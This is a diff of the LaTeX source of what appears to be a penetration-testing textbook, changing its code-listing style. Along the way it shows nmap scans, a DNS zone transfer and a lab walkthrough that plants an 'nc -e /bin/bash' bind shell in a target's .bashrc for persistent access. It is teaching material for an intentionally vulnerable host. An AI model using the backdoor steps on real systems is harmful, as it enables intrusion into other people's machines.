@@ -17,13 +17,13 @@
 			This will send TCP SYN packets to the specified ports on the target computer, listening for the SYN/ACK response.
 			If a SYN/ACK packet is received, the port is marked as open, the packet is examined for service fingerprinting and an RST packet is sent to stop the connection and prevent accidental DoS.
 			Using nmap, the ``-sS'' flag is used to run a SYN scan.
-			\begin{lstlisting}[style=CLI]
+			\begin{minted}[autogobble,breaklines]{console}
 				$ nmap -sS <Target IP>
-			\end{lstlisting}
+			\end{minted}
 			This will output all of the services which are found to be running on the remote system.
 			A sample output of an nmap SYN scan can be seen below.
 			Note that this is an exaggerated response, as the target scanned was intentionally vulnerable.
-			\lstinputlisting[language=nmap]{./shellOut/nmapSYN.out}
+			\concode{./shellOut/nmapSYN.out}
 
 		\subsection{Other Scan Types}
 			While SYN scanning is useful, it has become easier to detect due to the introduction of IPS with partial connection rules.
@@ -359,13 +359,13 @@
 
 		The first step is to set up public key infrastructure (see chapter \ref{ch:Cryptography}).
 		This is done using the easy-rsa scripts with the following commands\footnote{\url{https://wiki.archlinux.org/index.php/Easy-rsa}}:
-			\begin{lstlisting}[style=CLI]
+			\begin{minted}[autogobble,breaklines]{console}
 				# ./build-ca
 				# ./build-key-server <name>
 				# ./build-dh
 				# ./build-key <client name>
 				# openvpn --genkey --secret keys/ta.key
-			\end{lstlisting}
+			\end{minted}
 		This will place the keys you will require for the next stage in the ``keys'' folder.
 		You should then move ``client.crt'', ``client.key'' and ``ta.key'' to the client.
 
@@ -375,9 +375,9 @@
 		Client config:
 		\lstinputlisting[numbers=none]{./shellOut/vpnClient.conf}
 		Finally, set up nat at the entrance to the VPN using the following command.
-			\begin{lstlisting}[style=CLI]
+			\begin{minted}[autogobble,breaklines]{console}
 				# iptables -t nat -A POSTROUTING -s <VPN ip range> -o eth0 -j MASQUERADE
-			\end{lstlisting}
+			\end{minted}
 
 		This will pass all of your traffic through the server, giving you access to the Internet from it's address.
 		Generally, this makes it harder for someone defending a network to identify you.
@@ -459,9 +459,9 @@
 				However, this can be subverted to get the server to enumerate the whole network to anyone if it is misconfigured.
 				There are a number of name servers\footnote{\url{https://digi.ninja/projects/zonetransferme.php}} which are vulnerable to this.
 				An example of such a zone transfer can be found by running the following command.
-				\begin{lstlisting}[style=CLI]
+				\begin{minted}[autogobble,breaklines]{console}
 					$ dig axfr @nsztm1.digi.ninja zonetransfer.me
-				\end{lstlisting}
+				\end{minted}
 				The output of this command is left as an exercise for the reader as the output would take multiple pages within this book.
 				However, this will output all relevant data about the domain that you are targeting.
 				This is because while you are accessing the name server from outside its internal zone, you are also transferring into it.
@@ -591,9 +591,9 @@
 
 			To do this, the first step is to determine what the computer you are targeting is running.
 			This is done using the tool ``nmap'' as below:
-			\begin{lstlisting}[style=CLI]
+			\begin{minted}[autogobble,breaklines]{console}
 				$ nmap -Sv <Target> -p-
-			\end{lstlisting}
+			\end{minted}
 			This will give us a list of the services which are running on the server, as well as their names and ports.
 			We will be looking at the FTP server, as it is currently allowing plain text authentication:
 			\begin{quote}
@@ -615,9 +615,9 @@
 
 			Now that we can alter files on their system, add the following line to their .bashrc.
 			This will open a listener on port 5005 which can be interacted with from any computer on the network.
-			\begin{lstlisting}[style=CLI]
+			\begin{minted}[autogobble,breaklines]{console}
 				$ nc -l -k -p 5005 -e /bin/bash
-			\end{lstlisting}
+			\end{minted}
 
 			Using FTP with the user name and password that you found, run the following commands:
 			\begin{verse}
@@ -630,9 +630,9 @@
 			This will mean that as soon as the msfadmin user logs into their account, a shell will be opened on port 5005.
 
 			At this point, we can get shell access to the computer using the following command:
-			\begin{lstlisting}[style=CLI]
+			\begin{minted}[autogobble,breaklines]{console}
 				$ ncat <target IP> 5005
-			\end{lstlisting}
+			\end{minted}
 			While you will not see it, this will give you access to a shell, but no prompt.
 			Try any shell command that you know, most will work.
 
